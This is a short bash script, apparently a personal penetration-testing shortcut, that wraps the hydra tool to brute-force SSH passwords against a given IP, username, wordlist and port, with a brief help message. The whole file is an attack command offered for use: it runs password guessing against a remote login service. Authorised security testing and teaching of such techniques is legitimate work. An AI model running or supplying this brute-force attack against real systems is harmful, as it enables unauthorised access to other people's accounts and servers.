#!/bin/bash
# IP, username, wordlist, port
if [[ $1 == '-h' || $1 == '--help' ]]
then
  echo "Help page for hydra_ssh_brute shortcut command"
  echo -e "\tUSAGE: hydra_ssh_brute [ip] [username] [wordlist] [port]"
  exit
fi

hydra -l $2 -P $3 $1 -t 4 ssh -s $4
